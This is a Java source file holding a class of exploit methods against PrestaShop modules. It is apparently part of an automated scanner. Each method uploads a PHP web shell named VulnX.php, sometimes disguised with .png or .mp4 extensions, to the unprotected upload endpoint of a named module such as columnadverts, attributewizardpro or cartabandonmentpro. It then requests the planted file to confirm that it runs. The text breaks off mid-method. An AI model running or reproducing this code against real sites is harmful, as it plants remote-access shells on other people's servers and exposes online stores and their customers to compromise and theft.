package com.funtap.awass.Exploit;

import com.funtap.awass.Exploit.Result.Result;
import okhttp3.*;

import java.io.File;

// vuln on  PHPUnit <7.5
public class prestashop_exploits {
    private boolean detect(String dump_data, String cookie, String sig) {
        try {
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .build();

            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        .url(dump_data)
                        .method("GET", null)
                        .build();
            } else {
                request = new Request.Builder()
                        .url(dump_data)
                        .method("GET", null)
                        .addHeader("cookie", cookie)
                        .build();
            }
            Response response = client.newCall(request).execute();
            String html = response.body().string();
            int code = response.code();
            if (html.contains(sig) & code == 200)
                return true;
        } catch (Exception e) {
            System.out.printf(e.getMessage());
        }
        return false;
    }

    public Result columnadverts(String domain, String cookie) {
        Result result = new Result();
        String endpoint = domain + "/modules/columnadverts/uploadimage.php";
        String sig = "Vuln X";
        String name = "columnadverts";
        String shell = "VulnX.php";
        String dump_data = domain + "/modules/columnadverts/slides/VulnX.php?Vuln=X";
        result = new Result(dump_data, name, false, shell);
        try {
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .build();
            MediaType mediaType = MediaType.parse("form-data");
            RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("image", "/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php",
                            RequestBody.create(MediaType.parse("application/octet-stream"),
                                    new File("/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php")))
                    .build();
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .build();
            } else {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .addHeader("cookie", cookie)
                        .build();
            }
            Response response = client.newCall(request).execute();
            if (detect(dump_data, cookie, sig))
                result = new Result(dump_data, name, true, shell);
        } catch (Exception e) {
            e.getMessage();
        }
        return result;
    }

    public Result soopabanners(String domain, String cookie) {
        String endpoint = domain + "/modules/soopabanners/uploadimage.php";
        Result result = new Result();
        String dump_data = domain + "/modules/soopabanners/slides/VulnX.php?Vuln=X";
        String sig = "Vuln X";
        String name = "soopabanners";
        String shell = "VulnX.php";
        result = new Result(dump_data, name, false, shell);
        try {
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .build();
            MediaType mediaType = MediaType.parse("form-data");
            RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("image", "/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php",
                            RequestBody.create(MediaType.parse("application/octet-stream"),
                                    new File("/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php")))
                    .build();
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .build();
            } else {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .addHeader("cookie", cookie)
                        .build();
            }
            Response response = client.newCall(request).execute();
            if (detect(dump_data, cookie, sig))
                result = new Result(dump_data, name, true, shell);
        } catch (Exception e) {
            e.getMessage();
        }
        return result;
    }

    public Result vtslide(String domain, String cookie) {
        String endpoint = domain + "/modules/vtermslideshow/uploadimage.php";
        Result result = new Result();
        String dump_data = domain + "/modules/vtermslideshow/slides/VulnX.php?Vuln=X";
        String sig = "Vuln X";
        String name = "vtslide";
        String shell = "VulnX.php";
        result = new Result(dump_data, name, false, shell);
        try {
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .build();
            MediaType mediaType = MediaType.parse("form-data");
            RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("image", "/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php",
                            RequestBody.create(MediaType.parse("application/octet-stream"),
                                    new File("/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php")))
                    .build();
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .build();
            } else {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .addHeader("cookie", cookie)
                        .build();
            }
            Response response = client.newCall(request).execute();
            if (detect(dump_data, cookie, sig))
                result = new Result(dump_data, name, true, shell);
        } catch (Exception e) {
            e.getMessage();
        }
        return result;
    }

    public Result simpleslideshow(String domain, String cookie) {
        String endpoint = domain + "/modules/simpleslideshow/uploadimage.php";
        Result result = new Result();
        String dump_data = domain + "/modules/simpleslideshow/slides/VulnX.php?Vuln=X";
        String sig = "Vuln X";
        String name = "simpleslideshow";
        String shell = "VulnX.php";
        result = new Result(dump_data, name, false, shell);
        try {
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .build();
            MediaType mediaType = MediaType.parse("form-data");
            RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("image", "/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php",
                            RequestBody.create(MediaType.parse("application/octet-stream"),
                                    new File("/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php")))
                    .build();
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .build();
            } else {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .addHeader("cookie", cookie)
                        .build();
            }
            Response response = client.newCall(request).execute();
            if (detect(dump_data, cookie, sig))
                result = new Result(dump_data, name, true, shell);
        } catch (Exception e) {
            e.getMessage();
        }
        return result;
    }

    public Result productpageadverts(String domain, String cookie) {
        String endpoint = domain + "/modules/productpageadverts/uploadimage.php";
        Result result = new Result();
        String dump_data = domain + "/modules/productpageadverts/slides/VulnX.php?Vuln=X";
        String sig = "Vuln X";
        String name = "productpageadverts";
        String shell = "VulnX.php";
        result = new Result(dump_data, name, false, shell);
        try {
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .build();
            MediaType mediaType = MediaType.parse("form-data");
            RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("image", "/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php",
                            RequestBody.create(MediaType.parse("application/octet-stream"),
                                    new File("/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php")))
                    .build();
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .build();
            } else {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .addHeader("cookie", cookie)
                        .build();
            }
            Response response = client.newCall(request).execute();
            if (detect(dump_data, cookie, sig))
                result = new Result(dump_data, name, true, shell);
        } catch (Exception e) {
            e.getMessage();
        }
        return result;
    }

    public Result productpageadvertsb(String domain, String cookie) {
        String endpoint = domain + "/modules/homepageadvertise2/uploadimage.php";
        Result result = new Result();
        String dump_data = domain + "/modules/homepageadvertise2/slides/VulnX.php?Vuln=X";
        String sig = "Vuln X";
        String name = "productpageadvertsb";
        String shell = "VulnX.php";
        result = new Result(dump_data, name, false, shell);
        try {
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .build();
            MediaType mediaType = MediaType.parse("form-data");
            RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("image", "/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php",
                            RequestBody.create(MediaType.parse("application/octet-stream"),
                                    new File("/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php")))
                    .build();
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .build();
            } else {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .addHeader("cookie", cookie)
                        .build();
            }
            Response response = client.newCall(request).execute();
            if (detect(dump_data, cookie, sig))
                result = new Result(dump_data, name, true, shell);
        } catch (Exception e) {
            e.getMessage();
        }
        return result;
    }

    public Result jro_homepageadvertise(String domain, String cookie) {
        String endpoint = domain + "/modules/jro_homepageadvertise/uploadimage.php";
        Result result = new Result();
        String dump_data = domain + "/modules/jro_homepageadvertise/slides/VulnX.php?Vuln=X";
        String sig = "Vuln X";
        String name = "jro_homepageadvertise";
        String shell = "VulnX.php";
        result = new Result(dump_data, name, false, shell);
        try {
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .build();
            MediaType mediaType = MediaType.parse("form-data");
            RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("image", "/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php",
                            RequestBody.create(MediaType.parse("application/octet-stream"),
                                    new File("/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php")))
                    .build();
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .build();
            } else {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .addHeader("cookie", cookie)
                        .build();
            }
            Response response = client.newCall(request).execute();
            if (detect(dump_data, cookie, sig))
                result = new Result(dump_data, name, true, shell);
        } catch (Exception e) {
            e.getMessage();
        }
        return result;
    }

    public Result attributewizardpro(String domain, String cookie) {
        String endpoint = domain + "/modules/attributewizardpro/file_upload.php";
        Result result = new Result();
        String dump_data = domain + "/modules/attributewizardpro/file_uploads/VulnX.php?Vuln=X";
        String sig = "Vuln X";
        String name = "attributewizardpro";
        String shell = "VulnX.php";
        result = new Result(dump_data, name, false, shell);
        try {
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .build();
            MediaType mediaType = MediaType.parse("form-data");
            RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("image", "/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php",
                            RequestBody.create(MediaType.parse("application/octet-stream"),
                                    new File("/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php")))
                    .build();
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .build();
            } else {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .addHeader("cookie", cookie)
                        .build();
            }
            Response response = client.newCall(request).execute();
            if (detect(dump_data, cookie, sig))
                result = new Result(dump_data, name, true, shell);
        } catch (Exception e) {
            e.getMessage();
        }
        return result;
    }

    public Result oneattributewizardpro(String domain, String cookie) {
        String endpoint = domain + "/modules/1attributewizardpro/file_upload.php";
        Result result = new Result();
        String dump_data = domain + "/modules/1attributewizardpro/file_uploads/VulnX.php?Vuln=X";
        String sig = "Vuln X";
        String name = "oneattributewizardpro";
        String shell = "VulnX.php";
        result = new Result(dump_data, name, false, shell);
        try {
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .build();
            MediaType mediaType = MediaType.parse("form-data");
            RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("image", "/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php",
                            RequestBody.create(MediaType.parse("application/octet-stream"),
                                    new File("/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php")))
                    .build();
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .build();
            } else {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .addHeader("cookie", cookie)
                        .build();
            }
            Response response = client.newCall(request).execute();
            if (detect(dump_data, cookie, sig))
                result = new Result(dump_data, name, true, shell);
        } catch (Exception e) {
            e.getMessage();
        }
        return result;
    }

    public Result attributewizardpro_old(String domain, String cookie) {
        String endpoint = domain + "/modules/attributewizardpro.OLD/file_upload.php";
        Result result = new Result();
        String dump_data = domain + "/modules/attributewizardpro.OLD/file_uploads/VulnX.php?Vuln=X";
        String sig = "Vuln X";
        String name = "attributewizardpro_old";
        String shell = "VulnX.php";
        result = new Result(dump_data, name, false, shell);
        try {
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .build();
            MediaType mediaType = MediaType.parse("form-data");
            RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("image", "/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php",
                            RequestBody.create(MediaType.parse("application/octet-stream"),
                                    new File("/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php")))
                    .build();
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .build();
            } else {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .addHeader("cookie", cookie)
                        .build();
            }
            Response response = client.newCall(request).execute();
            if (detect(dump_data, cookie, sig))
                result = new Result(dump_data, name, true, shell);
        } catch (Exception e) {
            e.getMessage();
        }
        return result;
    }

    public Result attributewizardpro_x(String domain, String cookie) {
        String endpoint = domain + "/modules/attributewizardpro_x/file_upload.php";
        Result result = new Result();
        String dump_data = domain + "/modules/attributewizardpro_x/file_uploads/VulnX.php?Vuln=X";
        String sig = "Vuln X";
        String name = "attributewizardpro_x";
        String shell = "VulnX.php";
        result = new Result(dump_data, name, false, shell);
        try {
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .build();
            MediaType mediaType = MediaType.parse("form-data");
            RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("image", "/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php",
                            RequestBody.create(MediaType.parse("application/octet-stream"),
                                    new File("/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php")))
                    .build();
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .build();
            } else {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .addHeader("cookie", cookie)
                        .build();
            }
            Response response = client.newCall(request).execute();
            if (detect(dump_data, cookie, sig))
                result = new Result(dump_data, name, true, shell);
        } catch (Exception e) {
            e.getMessage();
        }
        return result;
    }

    public Result advancedslider(String domain, String cookie) {
        String endpoint = domain + "/modules/advancedslider/ajax_advancedsliderUpload.php?action=submitUploadImage%26id_slide=php";
        Result result = new Result();
        String dump_data = domain + "/modules/advancedslider/uploads/VulnX.php.png?Vuln=X";
        String sig = "Vuln X";
        String name = "advancedslider";
        String shell = "VulnX.php.png";
        result = new Result(dump_data, name, false, shell);
        try {
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .build();
            MediaType mediaType = MediaType.parse("form-data");
            RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("image", "/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php.png",
                            RequestBody.create(MediaType.parse("application/octet-stream"),
                                    new File("/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php.png")))
                    .build();
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .build();
            } else {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .addHeader("cookie", cookie)
                        .build();
            }
            Response response = client.newCall(request).execute();
            if (detect(dump_data, cookie, sig))
                result = new Result(dump_data, name, true, shell);
        } catch (Exception e) {
            e.getMessage();
        }
        return result;
    }

    public Result cartabandonmentpro(String domain, String cookie) {
        String endpoint = domain + "/modules/cartabandonmentpro/upload.php";
        Result result = new Result();
        String dump_data = domain + "/modules/cartabandonmentpro/uploads/VulnX.php.png?Vuln=X";
        String sig = "Vuln X";
        String name = "cartabandonmentpro";
        String shell = "VulnX.php.png";
        result = new Result(dump_data, name, false, shell);
        try {
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .build();
            MediaType mediaType = MediaType.parse("form-data");
            RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("image", "/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php.png",
                            RequestBody.create(MediaType.parse("application/octet-stream"),
                                    new File("/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php.png")))
                    .build();
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .build();
            } else {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .addHeader("cookie", cookie)
                        .build();
            }
            Response response = client.newCall(request).execute();
            if (detect(dump_data, cookie, sig))
                result = new Result(dump_data, name, true, shell);
        } catch (Exception e) {
            e.getMessage();
        }
        return result;
    }

    public Result cartabandonmentpro_old(String domain, String cookie) {
        String endpoint = domain + "/modules/cartabandonmentproOld/upload.php";
        Result result = new Result();
        String dump_data = domain + "/modules/cartabandonmentproOld/uploads/VulnX.php.png?Vuln=X";
        String sig = "Vuln X";
        String name = "cartabandonmentpro_old";
        String shell = "VulnX.php.png";
        result = new Result(dump_data, name, false, shell);
        try {
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .build();
            MediaType mediaType = MediaType.parse("form-data");
            RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("image", "/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php.png",
                            RequestBody.create(MediaType.parse("application/octet-stream"),
                                    new File("/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php.png")))
                    .build();
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .build();
            } else {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .addHeader("cookie", cookie)
                        .build();
            }
            Response response = client.newCall(request).execute();
            if (detect(dump_data, cookie, sig))
                result = new Result(dump_data, name, true, shell);
        } catch (Exception e) {
            e.getMessage();
        }
        return result;
    }

    public Result videostab(String domain, String cookie) {
        String endpoint = domain + "/modules/videostab/ajax_videostab.php?action=submitUploadVideo%26id_product=upload";
        Result result = new Result();
        String dump_data = domain + "/modules/cartabandonmentproOld/uploads/VulnX.php.png?Vuln=X";
        String sig = "Vuln X";
        String name = "videostab";
        String shell = "VulnX.php.mp4";
        result = new Result(dump_data, name, false, shell);
        try {
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .build();
            MediaType mediaType = MediaType.parse("form-data");
            RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("image", "/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php.mp4",
                            RequestBody.create(MediaType.parse("application/octet-stream"),
                                    new File("/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php.mp4")))
                    .build();
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .build();
            } else {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .addHeader("cookie", cookie)
                        .build();
            }
            Response response = client.newCall(request).execute();
            if (detect(dump_data, cookie, sig))
                result = new Result(dump_data, name, true, shell);
        } catch (Exception e) {
            e.getMessage();
        }
        return result;
    }

    public Result wg24themeadministration(String domain, String cookie) {
        String endpoint = domain + "/modules//wg24themeadministration/wg24_ajax.php";
        Result result = new Result();
        String dump_data = domain + "/modules/wg24themeadministration/img/upload/VulnX.php?Vuln=X";
        String sig = "Vuln X";
        String name = "wg24themeadministration";
        String shell = "VulnX.php";
        result = new Result(dump_data, name, false, shell);
        try {
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .build();
            MediaType mediaType = MediaType.parse("form-data");
            RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("image", "/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php",
                            RequestBody.create(MediaType.parse("application/octet-stream"),
                                    new File("/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php")))
                    .addFormDataPart("type", "pattern_upload")
                    .build();
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .build();
            } else {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .addHeader("cookie", cookie)
                        .build();
            }
            Response response = client.newCall(request).execute();
            if (detect(dump_data, cookie, sig))
                result = new Result(dump_data, name, true, shell);
        } catch (Exception e) {
            e.getMessage();
        }
        return result;
    }

    public Result fieldvmegamenu(String domain, String cookie) {
        String endpoint = domain + "/modules/fieldvmegamenu/ajax/upload.php";
        Result result = new Result();
        String dump_data = domain + "/modules/fieldvmegamenu/uploads/VulnX.php?Vuln=X";
        String sig = "Vuln X";
        String name = "fieldvmegamenu";
        String shell = "VulnX.php";
        result = new Result(dump_data, name, false, shell);
        try {
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .build();
            MediaType mediaType = MediaType.parse("form-data");
            RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("image", "/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php",
                            RequestBody.create(MediaType.parse("application/octet-stream"),
                                    new File("/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php")))
                    .build();
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .build();
            } else {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .addHeader("cookie", cookie)
                        .build();
            }
            Response response = client.newCall(request).execute();
            if (detect(dump_data, cookie, sig))
                result = new Result(dump_data, name, true, shell);
        } catch (Exception e) {
            e.getMessage();
        }
        return result;
    }

    public Result wdoptionpanel(String domain, String cookie) {
        String endpoint = domain + "/modules/wdoptionpanel/wdoptionpanel_ajax.php";
        Result result = new Result();
        String dump_data = domain + "/modules/wdoptionpanel/upload/VulnX.php?Vuln=X";
        String sig = "Vuln X";
        String name = "wdoptionpanel";
        String shell = "VulnX.php";
        result = new Result(dump_data, name, false, shell);
        try {
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .build();
            MediaType mediaType = MediaType.parse("form-data");
            RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("image", "/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php",
                            RequestBody.create(MediaType.parse("application/octet-stream"),
                                    new File("/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php")))
                    .addFormDataPart("type", "pattern_upload")
                    .build();
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .build();
            } else {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .addHeader("cookie", cookie)
                        .build();
            }
            Response response = client.newCall(request).execute();
            if (detect(dump_data, cookie, sig))
                result = new Result(dump_data, name, true, shell);
        } catch (Exception e) {
            e.getMessage();
        }
        return result;
    }
    public Result pk_flexmenu(String domain, String cookie) {
        String endpoint = domain + "/modules/pk_flexmenu/ajax/upload.php";
        Result result = new Result();
        String dump_data = domain + "/modules/pk_flexmenu/uploads/VulnX.php?Vuln=X";
        String sig = "Vuln X";
        String name = "pk_flexmenu";
        String shell = "VulnX.php";
        result = new Result(dump_data, name, false, shell);
        try {
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .build();
            MediaType mediaType = MediaType.parse("form-data");
            RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("image[]", "/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php",
                            RequestBody.create(MediaType.parse("application/octet-stream"),
                                    new File("/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php")))
                    .build();
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .build();
            } else {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .addHeader("cookie", cookie)
                        .build();
            }
            Response response = client.newCall(request).execute();
            if (detect(dump_data, cookie, sig))
                result = new Result(dump_data, name, true, shell);
        } catch (Exception e) {
            e.getMessage();
        }
        return result;
    }
    public Result pk_vertflexmenu(String domain, String cookie) {
        String endpoint = domain + "/modules/pk_vertflexmenu/ajax/upload.php";
        Result result = new Result();
        String dump_data = domain + "/modules/pk_vertflexmenu/uploads/VulnX.php?Vuln=X";
        String sig = "Vuln X";
        String name = "pk_vertflexmenu";
        String shell = "VulnX.php";
        result = new Result(dump_data, name, false, shell);
        try {
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .build();
            MediaType mediaType = MediaType.parse("form-data");
            RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("image[]", "/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php",
                            RequestBody.create(MediaType.parse("application/octet-stream"),
                                    new File("/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php")))
                    .build();
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .build();
            } else {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .addHeader("cookie", cookie)
                        .build();
            }
            Response response = client.newCall(request).execute();
            if (detect(dump_data, cookie, sig))
                result = new Result(dump_data, name, true, shell);
        } catch (Exception e) {
            e.getMessage();
        }
        return result;
    }
    public Result nvn_export_orders(String domain, String cookie) {
        String endpoint = domain + "/modules/nvn_export_orders/upload.php";
        Result result = new Result();
        String dump_data = domain + "/modules/nvn_export_orders/nvn_extra_add.php?Vuln=X";
        String sig = "Vuln X";
        String name = "nvn_export_orders";
        String shell = "VulnX.php";
        result = new Result(dump_data, name, false, shell);
        try {
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .build();
            MediaType mediaType = MediaType.parse("form-data");
            RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("image[]", "/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php",
                            RequestBody.create(MediaType.parse("application/octet-stream"),
                                    new File("/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php")))
                    .build();
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .build();
            } else {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .addHeader("cookie", cookie)
                        .build();
            }
            Response response = client.newCall(request).execute();
            if (detect(dump_data, cookie, sig))
                result = new Result(dump_data, name, true, shell);
        } catch (Exception e) {
            e.getMessage();
        }
        return result;
    }
    public Result tdpsthemeoptionpanel(String domain, String cookie) {
        String endpoint = domain + "/modules/tdpsthemeoptionpanel/tdpsthemeoptionpanelAjax.php";
        Result result = new Result();
        String dump_data = domain + "/modules/tdpsthemeoptionpanel/upload/VulnX.php?Vuln=X";
        String sig = "Vuln X";
        String name = "tdpsthemeoptionpanel";
        String shell = "VulnX.php";
        result = new Result(dump_data, name, false, shell);
        try {
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .build();
            MediaType mediaType = MediaType.parse("form-data");
            RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("image[]", "/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php",
                            RequestBody.create(MediaType.parse("application/octet-stream"),
                                    new File("/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php")))
                    .build();
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .build();
            } else {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .addHeader("cookie", cookie)
                        .build();
            }
            Response response = client.newCall(request).execute();
            if (detect(dump_data, cookie, sig))
                result = new Result(dump_data, name, true, shell);
        } catch (Exception e) {
            e.getMessage();
        }
        return result;
    }
    public Result masseditproduct(String domain, String cookie) {
        String endpoint = domain + "/modules/lib/redactor/file_upload.php";
        Result result = new Result();
        String dump_data = domain +"/masseditproduct/uploads/file/VulnX.php?Vuln=X";
        String sig = "Vuln X";
        String name = "masseditproduct";
        String shell = "VulnX.php";
        result = new Result(dump_data, name, false, shell);
        try {
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .build();
            MediaType mediaType = MediaType.parse("form-data");
            RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("image[]", "/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php",
                            RequestBody.create(MediaType.parse("application/octet-stream"),
                                    new File("/src/main/java/com/funtap/awass/Exploit/shell/VulnX.php")))
                    .build();
            Request request = null;
            if (cookie == null) {
                request = new Request.Builder()
                        .url(endpoint)
                        .method("POST", body)
                        .addHeader("Content-Type", "form-data")
                        .build();
            } else {
                request = new Request.Builder()
